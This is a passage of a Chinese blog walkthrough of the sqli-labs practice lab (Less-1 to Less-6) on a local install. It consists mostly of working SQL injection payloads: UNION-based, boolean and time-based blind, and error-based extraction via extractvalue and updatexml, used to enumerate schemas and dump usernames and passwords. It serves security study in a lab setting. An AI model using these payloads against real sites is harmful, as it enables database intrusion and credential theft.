id="使用order-by-判断字段数"><a href="#使用order-by-判断字段数" class="headerlink" title="使用order by 判断字段数"></a>使用order by 判断字段数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>bachang<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-1</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3--+ # 回显正常</span><br><span class="hljs-string">http://127.0.0.1/bachang/sqli-labs/Less-1/?id=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span><span class="hljs-comment">--+ # 显示错误</span><br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230228202234004.png" alt="image-20230228202234004"></p><p>当选择排序第四列的时候，返回不知道第四列，说明没有第四列，判断这张表有三列</p><h3 id="使用union-进行联合查询"><a href="#使用union-进行联合查询" class="headerlink" title="使用union 进行联合查询"></a>使用union 进行联合查询</h3><ul><li>对于 union 而言，如果第一个 sql 语句的查询语句为错误的话，那么他会将第二个 sql 语句的查询结果作为最后的数据，所以前面一个 id 输入一个非正确的值，如0或 - 1</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>bachang<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-1</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230228202614005.png" alt="image-20230228202614005"></p><p>回显位是2,3</p><h3 id="使用group-concat爆破表名，列名，数据信息"><a href="#使用group-concat爆破表名，列名，数据信息" class="headerlink" title="使用group_concat爆破表名，列名，数据信息"></a>使用group_concat爆破表名，列名，数据信息</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+   # 爆当前数据库中的表</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>information_schema：内置数据库</p><ul><li>&#96;&#96;&#96;sql<br>里面有三张表:schemata tables columns<br>schemata表中存储了mysql中所有数据库的信息包括数据库名编码类型<br>tables表中存储了mysql中所有的数据库的表的信息<br>columns表中存储了mysql中所有表的字段信息<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br><span class="hljs-keyword">user</span>表：mysql中存在一个独立的数据库(mysql),当中有很多表,保存着mysql中的各种参数,其中<span class="hljs-keyword">user</span>表段设置了mysql数据库用户的部分信息<br><br>- <span class="hljs-keyword">user</span>表段中,<span class="hljs-keyword">user</span>字段为用户登录名,可以有相同的名字重复<br>- <span class="hljs-keyword">password</span>字段为登录的密码哈希值,是<span class="hljs-number">40</span>位的密文,类似于md5<br>- host字段设置的是这个用户可以在哪些机器上面的登录,如果为localhost表示只能在本机登录,host可以是数据库ip也可以是数据库服务器的名称,若host为localhost的话不一定没有希望,如果服务器网站装有phpmyadmin,仍可以利用<br>- file_priv字段规定了这个用户是不是可以读取硬盘的里的文件,设置为Y表示允许,设置为N表示禁止<br><br>![image<span class="hljs-number">-20230228203556177</span>](sqllibsGET类型注入.assets/image<span class="hljs-number">-20230228203556177.</span>png)<br><br>查users表中的列名<br><br>```<span class="hljs-keyword">sql</span><br>?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name=&#x27;</span>users<span class="hljs-string">&#x27; --+   </span><br></code></pre></td></tr></table></figure></li></ul><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230228204008736.png" alt="image-20230228204008736"></p><p>查users中的数据信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>bachang<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-1</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;union select 1,group_concat(username,password),3 from users--+</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230228204239337.png" alt="image-20230228204239337"></p><h2 id="less-2-基于错误的GET数字型注入"><a href="#less-2-基于错误的GET数字型注入" class="headerlink" title="less-2:基于错误的GET数字型注入"></a>less-2:基于错误的GET数字型注入</h2><h3 id="注入点判断-1"><a href="#注入点判断-1" class="headerlink" title="注入点判断"></a>注入点判断</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>  正常<br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;  错误<br>?<span class="hljs-built_in">id</span> = <span class="hljs-number">1</span>&#x27;&#x27; 错误<br>?<span class="hljs-built_in">id</span> = <span class="hljs-number">1</span>&#x27; <span class="hljs-comment">--+ 错误</span><br><br></code></pre></td></tr></table></figure><p>由此猜测是数字型注入</p><p>sql源码语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>$_GET[id] limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>无论是单引号还是双引号还是其他的符号，他都不会闭合，会引起报错</p><h3 id="判断列，回显位；爆表，数据"><a href="#判断列，回显位；爆表，数据" class="headerlink" title="判断列，回显位；爆表，数据"></a>判断列，回显位；爆表，数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 判断列<br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span><span class="hljs-comment">--+ </span><br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">--+</span><br># 判断回显位<br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br># 查看数据库<br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-comment">--+</span><br># 查指定数据库中的表<br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>&quot;security&quot;<span class="hljs-comment">--+</span><br># 查users表<br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>&quot;users&quot;<span class="hljs-comment">--+</span><br>查users中username和password的内容<br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username,password),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h2 id="less-3-基于错误的GET单引号加括号注入"><a href="#less-3-基于错误的GET单引号加括号注入" class="headerlink" title="less-3 基于错误的GET单引号加括号注入"></a>less-3 基于错误的GET单引号加括号注入</h2><h3 id="注入点判断-2"><a href="#注入点判断-2" class="headerlink" title="注入点判断"></a>注入点判断</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> 正常<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; --+错误</span><br><span class="hljs-string">?id=1&#x27;</span>) <span class="hljs-comment">--+ 正常</span><br></code></pre></td></tr></table></figure><p>由此判断单引号加括号注入</p><h3 id="判断列，回显位；爆表，数据-1"><a href="#判断列，回显位；爆表，数据-1" class="headerlink" title="判断列，回显位；爆表，数据"></a>判断列，回显位；爆表，数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 判断列<br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) order by 4--+ </span><br><span class="hljs-string">id=1&#x27;</span>) <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">--+</span><br># 判断回显位<br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,2,3--+</span><br><span class="hljs-string"># 查看数据库</span><br><span class="hljs-string">id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-comment">--+</span><br># 查指定数据库中的表<br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot;--+</span><br><span class="hljs-string"># 查users表</span><br><span class="hljs-string">id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>&quot;users&quot;<span class="hljs-comment">--+</span><br>查users中username和password的内容<br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,group_concat(username,password),3 from users--+</span><br></code></pre></td></tr></table></figure><h2 id="less-4-基于错误的GET双引号注入"><a href="#less-4-基于错误的GET双引号注入" class="headerlink" title="less-4:基于错误的GET双引号注入"></a>less-4:基于错误的GET双引号注入</h2><p>源码</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> (<span class="hljs-string">&quot;id&quot;</span>) <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 判断列<br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;) order by 4--+ <br>id=1&quot;) <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">--+</span><br># 判断回显位<br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot;) union select 1,2,3--+<br># 查看数据库<br>id=-1&quot;) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-comment">--+</span><br># 查指定数据库中的表<br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot;--+<br># 查users表<br>id=-1&quot;) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span>&quot;users&quot;<span class="hljs-comment">--+</span><br>查users中username和password的内容<br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot;) union select 1,group_concat(username,password),3 from users--+<br></code></pre></td></tr></table></figure><h2 id="less-5-基于单引号的双注入"><a href="#less-5-基于单引号的双注入" class="headerlink" title="less-5:基于单引号的双注入"></a>less-5:基于单引号的双注入</h2><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>和less-1相同</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230228221956601.png" alt="image-20230228221956601"></p><p>输入?id&#x3D;1’–+是正常应该回显第一个信息，但是却回显下图</p><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230228222108161.png" alt="image-20230228222108161"></p><ol><li>不管输入id为多少，页面一直都是 you are in ….猜测正确的页面不变，不会将查询结果打印到页面了，但是如果语句错误会返回报错信息</li></ol><p>通过上面的特点来看应该是报错注入</p><h3 id="方法一：布尔盲注"><a href="#方法一：布尔盲注" class="headerlink" title="方法一：布尔盲注"></a>方法一：布尔盲注</h3><p>测试数据库长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and length(database())=8--+回显you are in....</span><br><span class="hljs-string">id=1&#x27;</span><span class="hljs-keyword">and</span> length(database())<span class="hljs-operator">=</span><span class="hljs-number">7</span><span class="hljs-comment">--+无回显</span><br></code></pre></td></tr></table></figure><p>可以得到数据库的长度为8</p><p>推测数据库的名称</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"> #判断首字母<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and left(database(),1)=&#x27;</span>s<span class="hljs-string">&#x27;--+   </span><br><span class="hljs-string">?id=1&#x27;</span><span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">115</span><span class="hljs-comment">--+</span><br># 表名字符长度和名称<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+</span><br><span class="hljs-string">?id=1&#x27;</span><span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">99</span><span class="hljs-comment">--+</span><br># 判断所有字段名的长度<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27;))&gt;20--+</span><br><span class="hljs-string">?id=1&#x27;</span><span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">99</span><span class="hljs-comment">--+</span><br>#判断表中数据长度，内容<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length((select group_concat(username,password) from users))&gt;109--+</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> group_concat(username,password) <span class="hljs-keyword">from</span> users),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">50</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>布尔盲注就是借用substr,ascii,length等函数来判断</p><h3 id="方法二：延时注入"><a href="#方法二：延时注入" class="headerlink" title="方法二：延时注入"></a>方法二：延时注入</h3><p>  如果页面一直不变这个时候我们可以使用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了if函数和sleep()函数。if(a,sleep(10),1)如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟。通过页面时间来判断出id参数是单引号字符串。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(1=1,sleep(5),1)--+</span><br><span class="hljs-string">判断参数构造。</span><br><span class="hljs-string">?id=1&#x27;</span><span class="hljs-keyword">and</span> if(length((<span class="hljs-keyword">select</span> database()))<span class="hljs-operator">&gt;</span><span class="hljs-number">9</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>判断数据库名长度<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span><br><span class="hljs-string">逐一判断数据库字符</span><br><span class="hljs-string"> </span><br><span class="hljs-string">?id=1&#x27;</span><span class="hljs-keyword">and</span> if(length((<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()))<span class="hljs-operator">&gt;</span><span class="hljs-number">13</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>判断所有表名长度<br> <br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="hljs-string">逐一判断表名</span><br><span class="hljs-string"> </span><br><span class="hljs-string">?id=1&#x27;</span><span class="hljs-keyword">and</span> if(length((<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">20</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>判断所有字段名的长度<br> <br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="hljs-string">逐一判断字段名。</span><br><span class="hljs-string"> </span><br><span class="hljs-string"> </span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> if(length((<span class="hljs-keyword">select</span> group_concat(username,password) <span class="hljs-keyword">from</span> users))<span class="hljs-operator">&gt;</span><span class="hljs-number">109</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br>判断字段内容长度<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="hljs-string">逐一检测内容。</span><br></code></pre></td></tr></table></figure><h3 id="方法三-报错注入"><a href="#方法三-报错注入" class="headerlink" title="方法三:报错注入"></a>方法三:报错注入</h3><h4 id="基于格式错误报错（xpath语法）"><a href="#基于格式错误报错（xpath语法）" class="headerlink" title="基于格式错误报错（xpath语法）"></a>基于格式错误报错（xpath语法）</h4><p>extractvalue()：</p><p>函数使用格式：extractvalue(xml_document,Xpath_string)，作用是从document中返回包含string的字符串，如果string参数不符合xpath的语法就会报错，将查询的结果放在报错信息里.</p><p>id&#x3D;’and(select extractvalue(“anything”,concat(‘~’,(select语句))))</p><p>分析：因为~符号不符合xpath的语法规则所以导致报错返回select语句执行结果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(&#x27;</span><span class="hljs-operator">~</span> &quot;,(select schema_name from information_schema.schemata limit N,1))))--+<br>//爆当前数据库的库名，获知当前的数据库名称为security<br><br>?id=-1&#x27; and extractvalue(1,<br>concat(&#x27;~ &#x27;,(select table_name from information_schema.tables where table_schema=database() limit N,1)))--+<br>//爆security数据库的表名，通过调整参数N获知security数据库中有一张表名为users<br><br>?id=-1&#x27; and extractvalue(1,<br>concat(&#x27;~ &quot;,(<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> limit N,<span class="hljs-number">1</span>)))<span class="hljs-comment">--+</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>爆users表中的字段名，通过调整参数N获知users表中包含id,username,password三个字段<br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(&#x27;</span><span class="hljs-operator">~</span> <span class="hljs-string">&#x27;,(select concat_ws(&#x27;</span>;<span class="hljs-string">&#x27;, id,username,password)from security.users limit N,1)))--+</span><br><span class="hljs-string">//通过调整参数N，爆users表中id,username,password三个字段的值</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230301165246459.png" alt="image-20230301165246459"></p><p>updatexml</p><p>使用格式：updatexml(xml_document,xpath_string,new_value)，作用是将document的中符合string的字符串替换为value的值。同上，这里string参数不符合xpath语法也报错。</p><p>id&#x3D;’and(select updatexml(“anything”,concat(‘~’,(select语句())),”anything”))</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">爆数据库名：<span class="hljs-string">&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class="hljs-string">爆表名：&#x27;</span><span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(table_name)<span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database())),<span class="hljs-number">0x7e</span>))<br>爆列名：<span class="hljs-string">&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="hljs-string">爆数据：&#x27;</span><span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(COLUMN_NAME)<span class="hljs-keyword">from</span> TABLE_NAME)),<span class="hljs-number">0x7e</span>))<br></code></pre></td></tr></table></figure><p>注：0x7e &#x3D; <del>，</del>也可以换为#，$等只要不符合xpath的语法规范即可</p><p>两个函数只能查询32位如果过多就需要使用limit或substring</p><h2 id="less-6-基于双引号的双注入"><a href="#less-6-基于双引号的双注入" class="headerlink" title="less-6 基于双引号的双注入"></a>less-6 基于双引号的双注入</h2><p>与less-5相同，使用报错注入演示</p><h3 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; //错误<br>?id=1&quot; <span class="hljs-comment">--+  //正确</span><br><br></code></pre></td></tr></table></figure><h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>bachang<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-6</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>&quot; and extractvalue(1,concat(&#x27;~&#x27;, (select schema_name from information_schema.schemata limit 5,1)))--+<br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230301170902567.png" alt="image-20230301170902567"></p><h3 id="爆当前数据库表名"><a href="#爆当前数据库表名" class="headerlink" title="爆当前数据库表名"></a>爆当前数据库表名</h3><figure 